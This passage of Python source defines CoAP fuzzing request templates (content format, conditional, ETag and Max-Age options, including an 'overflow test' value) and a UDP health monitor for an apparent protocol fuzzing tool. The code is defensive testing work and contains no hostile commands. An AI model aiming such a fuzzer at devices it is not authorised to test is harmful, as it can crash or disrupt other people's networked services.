                ),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("content_payload", '{"value": 42}', max_len=256),
            ),
        )
        if self.is_request_enabled("CoAP_Content_Format"):
            self.session.connect(coap_content_format)

        # Conditional requests (If-Match, If-None-Match)
        coap_conditional = Request(
            "CoAP_Conditional",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 2), fuzzable=True),
                Byte(name="code", default_value=self.PUT, fuzzable=True),
                Word(name="message_id", default_value=0x5007, endian=">"),
                Word(name="token", default_value=0x99AA, endian=">"),
                Group(
                    name="conditional_opts",
                    values=[
                        b"\x14\xde\xad\xbe\xef",  # If-Match with ETag
                        b"\x50",  # If-None-Match
                        b"\x18" + b"\xab" * 8,  # If-Match with 8-byte ETag
                        b"\x10",  # If-Match empty
                    ],
                ),
                # Uri-Path follows If-Match (option 1), so delta = 11 - 1
                Static(
                    name="uri_path",
                    default_value=self._build_uri_path_option("conditional", prev_option=1),
                ),
                Static(name="payload_marker", default_value=b"\xff"),
                SmartString("cond_payload", "updated_value", max_len=128),
            ),
        )
        if self.is_request_enabled("CoAP_Conditional"):
            self.session.connect(coap_conditional)

        # ETag option testing
        coap_etag = Request(
            "CoAP_ETag",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 2), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x5008, endian=">"),
                Word(name="token", default_value=0x7788, endian=">"),
                Group(
                    name="etag_values",
                    values=[
                        b"\x44\x12\x34\x56\x78",  # 4-byte ETag
                        b"\x48" + b"\xab" * 8,  # 8-byte ETag (max)
                        b"\x40",  # Empty ETag
                    ],
                ),
                Static(name="uri_path", default_value=self._build_uri_path_option("resource")),
            ),
        )
        if self.is_request_enabled("CoAP_ETag"):
            self.session.connect(coap_etag)

        # Max-Age and cache control
        coap_cache = Request(
            "CoAP_Cache_Control",
            children=(
                Byte(name="header", default_value=coap_header_byte(1, self.CON, 0), fuzzable=True),
                Byte(name="code", default_value=self.GET, fuzzable=True),
                Word(name="message_id", default_value=0x5009, endian=">"),
                Static(name="uri_path", default_value=self._build_uri_path_option("cached")),
                Group(
                    name="max_age_values",
                    values=[
                        b"\x30",  # Max-Age=0
                        b"\x31\x3c",  # Max-Age=60 (1 min)
                        b"\x32\x0e\x10",  # Max-Age=3600 (1 hour)
                        b"\x34\x00\x01\x51\x80",  # Max-Age=86400 (1 day)
                        b"\x34\xff\xff\xff\xff",  # Max-Age=max (overflow test)
                    ],
                ),
            ),
        )
        if self.is_request_enabled("CoAP_Cache_Control"):
            self.session.connect(coap_cache)

    def _get_monitors(self) -> List[BaseMonitor]:
        """Return list of monitors for CoAP service"""
        monitors = []
        from oida.fuzz.monitors import CoAPHealthMonitor

        # CoAP runs over UDP; a TCP-connect monitor (SocketHealthMonitor)
        # always fails against it -- preflight aborted every run. Probe with
        # a real CoAP CON GET instead (any ACK/RST/datagram = alive).
        if self.config:
            coap_monitor = CoAPHealthMonitor(
                host=self.config.target_ip, port=self.config.target_port, retry_count=3
            )
            monitors.append(coap_monitor)

        return monitors

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """Setup CoAP-specific monitors"""
        return self._get_monitors()
